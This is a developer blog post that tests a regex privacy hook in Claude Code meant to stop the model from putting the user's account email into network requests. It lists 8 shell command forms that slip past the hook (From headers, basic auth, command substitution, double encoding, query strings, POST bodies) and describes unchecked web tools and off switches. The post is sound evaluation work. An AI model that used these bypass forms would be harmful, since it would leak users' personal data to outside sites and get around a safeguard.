@@ -1,0 +1,258 @@
+8 leaks pass Anthropic's 23-test email fix - DEV Community
+
+ Skip to content [#main-content]
+
+ [/]
+
+ Powered by Algolia
+
+ [https://www.algolia.com/developers/?utm_source=devto&utm_medium=referral]
+
+ Log in
+ [https://dev.to/enter?signup_subforem=1]
+
+ Create account
+ [https://dev.to/enter?signup_subforem=1&state=new-user]
+
+DEV Community
+
+ Add reaction
+
+ Like
+
+ Unicorn
+
+ Exploding Head
+
+ Raised Hands
+
+ Fire
+
+ Jump to Comments
+
+ Save
+
+ Boost
+
+Pick as gem
+
+ Copy link
+
+Copied to Clipboard
+
+ Share to X
+ [https://twitter.com/intent/tweet?text=%228%20leaks%20pass%20Anthropic%27s%2023-test%20email%20fix%22%20by%20frank%20chu%20%23DEVCommunity%20https%3A%2F%2Fdev.to%2Ffrankchu%2F8-leaks-pass-anthropics-23-test-email-fix-2e66]
+
+ Share to LinkedIn
+ [https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fdev.to%2Ffrankchu%2F8-leaks-pass-anthropics-23-test-email-fix-2e66&title=8%20leaks%20pass%20Anthropic%27s%2023-test%20email%20fix&summary=I%20ran%20Anthropic%27s%20cc-plugin-privacy%20mod%2023%20times%20against%20its%20own%20README%3A%2010%20blocks%2C%208%20leaks%2C%204%20false%20refusals.&source=DEV%20Community]
+
+ Share to Facebook
+ [https://www.facebook.com/sharer.php?u=https%3A%2F%2Fdev.to%2Ffrankchu%2F8-leaks-pass-anthropics-23-test-email-fix-2e66]
+
+ Share to Mastodon
+ [https://s2f.kytta.dev/?text=https%3A%2F%2Fdev.to%2Ffrankchu%2F8-leaks-pass-anthropics-23-test-email-fix-2e66]
+
+ Share Post via... [#]
+
+ Report Abuse [/report-abuse]
+
+ [https://media2.dev.to/dynamic/image/width=1000,height=420,fit=cover,gravity=auto,format=auto/https%3A%2F%2Fraw.githubusercontent.com%2Ffrankchu91%2FWhatTechPost%2Fmain%2Fpublished%2F2026-11-05-claude-email-fix%2Fcover.png]
+
+ [/frankchu]
+
+ frank chu [/frankchu]
+
+ Posted on Nov 6
+
+ 8 leaks pass Anthropic's 23-test email fix
+
+ #programming [/t/programming]
+ #claude [/t/claude]
+ #privacy [/t/privacy]
+ #discuss [/t/discuss]
+
+ [#8-leaks-pass-anthropics-23test-email-fix]
+ 8 leaks pass Anthropic's 23-test email fix
+
+Anthropic's fix for Claude Code leaking your email address is 171 lines of regexes. I ran the actual code 23 times: it blocks the exact leak from the bug report and lets 8 other shapes of the same leak straight through.
+
+ [#the-bug-in-one-paragraph]
+ The bug, in one paragraph
+
+Claude Code hands the model your signed-in account's email in its context, so the model can identify you. When a user asked it to research something on Wikipedia — whose bot policy asks scripted clients to identify themselves with a contact email — the model put the user's email into curl's User-Agent header and sent it to a third-party site. The original report, issue #81138, was filed July 25, 2026. The fix shipped in v2.1.317 on November 3 — 101 days later. In between, issue #107757 (November 5, v2.1.318) reports a user getting "dozens of scam emails per day" because the address went out in User-Agent headers "while conducting web searches without my permission."
+
+ [#what-the-fix-actually-is]
+ What the fix actually is
+
+The fix is a built-in mod, cc-plugin-privacy, and Anthropic published its source in the mods/privacy folder of the public anthropics/claude-code repo. The whole thing is 6 TypeScript files, 171 lines. One tool.check hook watches Bash, Monitor, and PowerShell calls. The test is two word matches over the whole input — the README says so itself: "There is no parser, on purpose: it keeps the test simple." If the call holds the account's email and names a User-Agent, it is refused, with no prompt. The README also says, verbatim: "This is a courtesy, not a boundary."
+
+ [#how-i-tested-it]
+ How I tested it
+
+I cloned the repo at main, took the mod's code as shipped, and ran its real namesUserAgentWithAddress function under Node 24 (the only change: import paths, so Node's type-stripping could load the .ts files). The test address was a fake, alice@example.com — no real account involved. 23 cases, each a shell line the model might plausibly emit. 0 mismatches against what the README claims the mod does.
+
+The blocks work — 10 of them:
+
+curl -A "alice@example.com" https://en.wikipedia.org/... DENY
+curl --user-agent alice@example.com https://example.org DENY
+curl --user-agent=alice@example.com https://example.org DENY
+curl -A "ALICE@EXAMPLE.COM" https://example.org DENY
+curl -A "alice%40example.com" https://example.org DENY
+wget -U alice@example.com https://example.org DENY
+Invoke-WebRequest -UserAgent "alice@example.com" ... DENY
+curl –A "alice@example.com" https://example.org (en dash) DENY
+
+Case-insensitive, one pass of percent-decoding, PowerShell and its Unicode dashes included. The straightforward leak is closed.
+
+ [#the-8-leaks]
+ The 8 leaks
+
+Every one of these passes the hook and leaves the machine if the line sends it:
+
+curl -H "From: alice@example.com" https://example.org PASS
+curl -u alice@example.com:secret https://example.org PASS
+curl -A "$(git config user.email)" https://example.org PASS
+curl -A "$EMAIL" https://example.org PASS
+curl -A "alice%2540example.com" https://example.org (double-enc) PASS
+curl https://example.org/?contact=alice@example.com PASS
+curl -d "email=alice@example.com" https://example.org/submit PASS
+curl -A "jos%C3%A9@example.com" https://example.org (non-ASCII) PASS
+
+The pattern: the hook only fires when the literal address and a User-Agent word appear in the same call. A From: header is not a User-Agent word. curl -u is basic auth, not a User-Agent. Anything computed at runtime — $(git config user.email), a variable — is invisible to a static string match. Double percent-encoding survives because the decoder runs once. A non-ASCII address percent-encoded survives because one decode pass produces two Latin-1 bytes, never the original character.
+
+And the largest hole is not in this list at all: the hook only watches shell tools. WebFetch and WebSearch are not checked, and neither are MCP tools — the README says so. The bug report's own scenario is "research something on Wikipedia." If the model does that research with WebFetch instead of curl, nothing in this mod ever sees the address.
+
+ [#the-4-false-refusals]
+ The 4 false refusals
+
+Two word matches with no parser cut both ways:
+
+curl -user alice@example.com https://example.org DENY
+echo "my user-agent is curl, contact alice@example.com" DENY
+curl -A "generic" https://example.org/alice@example.com DENY
+curl -A "bot" https://example.org/?q=jo%40x.ua: DENY
+
+curl -user is real curl's -u flag with ser as the username — but the hook reads it as a User-Agent word. Mentioning "user-agent" in the same breath as the address is enough, even in an echo. A generic User-Agent plus the address anywhere else in the line — a URL path, a query string — is refused too. The README accepts these: "Those false refusals are accepted for simplicity."
+
+ [#the-off-switches]
+ The off switches
+
+Three ways the protection disappears without the user doing anything wrong: /plugin disable or an enabledPlugins setting turns it off; a server-side switch, read once per session, can turn it off; and a hook from an installed plugin sits above this one on tool.check and may overrule the refusal. The release notes for v2.1.317 describe the feature as "a check that asks before a web or shell tool call sends your account email address to the network" — but the shipped mod raises no prompt. It denies, silently, or it is off.
+
+ [#the-verdict]
+ The verdict
+
+The mod does exactly what its 171 lines promise, and I verified all 23 cases against the published code. The problem is the shape of the promise: it guards one spelling of one leak — a literal email next to a User-Agent word in a shell call — while the address can leave through a header, basic auth, a variable, a second encoding pass, or the built-in web tools the model reaches for first. Anthropic's own README calls it a courtesy, not a boundary. Read it that way. If your threat model is "the model must never send my email to a website," this is not the control that delivers it — the deterministic check would have to sit on the network call itself, not on a string match over the shell line that might produce it.
+
+Sources: anthropics/claude-code issue #81138 (July 25, 2026) and #107757 (November 5, 2026); mods/privacy source and README at main; v2.1.317 release notes (November 3, 2026). All 23 test results above are from my own runs of the shipped code; the test address was fake.
+
+ Top comments (0)
+
+ Subscribe
+
+ Submit
+ Preview
+ Dismiss [/404.html]
+
+ Code of Conduct [/code-of-conduct]
+ •
+ Report abuse [/report-abuse]
+
+ frank chu
+
+ [/frankchu]
+
+ Follow
+
+ Work
+
+ Meta
+
+ Joined
+
+ Jul 21, 2026
+
+ More from frank chu [/frankchu]
+
+ 2 years of bank data: Claude reads your money now
+
+ #ai
+ #claude
+ #plaid
+ #discuss
+
+ [/frankchu/2-years-of-bank-data-claude-reads-your-money-now-33nn]
+
+ 300 chars opened a locked musl account on try 2
+
+ #programming
+ #ssh
+ #musl
+ #discuss
+
+ [/frankchu/300-chars-opened-a-locked-musl-account-on-try-2-25ni]
+
+ DEV Community [/] — A space to discuss and keep up software development and manage your software career
+
+ Home
+ [/]
+
+ DEV Challenges
+ [/challenges]
+
+ DEV++
+ [/++]
+
+ Videos
+ [/videos]
+
+ DEV Education Tracks
+ [/deved]
+
+ DEV Help
+ [/help]
+
+ Advertise on DEV
+ [/advertise]
+
+ Organization Accounts
+ [/organizations]
+
+ DEV Showcase
+ [/showcase]
+
+ About
+ [/about]
+
+ Contact
+ [/contact]
+
+ Free Postgres Database
+ [/free-postgres-database-tier]
+
+ DEV Shop
+ [https://shop.forem.com/]
+
+ MLH
+ [https://mlh.io/]
+
+ Code of Conduct
+ [/code-of-conduct]
+
+ Privacy Policy
+ [/privacy]
+
+ Terms of Use
+ [/terms]
+
+Built on Forem [https://www.forem.com] — the open source [https://dev.to/t/opensource] software that powers DEV [https://dev.to] and other inclusive communities.
+
+Made with love and Ruby on Rails [https://dev.to/t/rails]. DEV Community © 2016 - 2026.
+
+ We're a place where coders share, stay up-to-date and grow their careers.
+
+ Log in
+ [https://dev.to/enter?signup_subforem=1]
+
+ Create account
+ [https://dev.to/enter?signup_subforem=1&state=new-user]
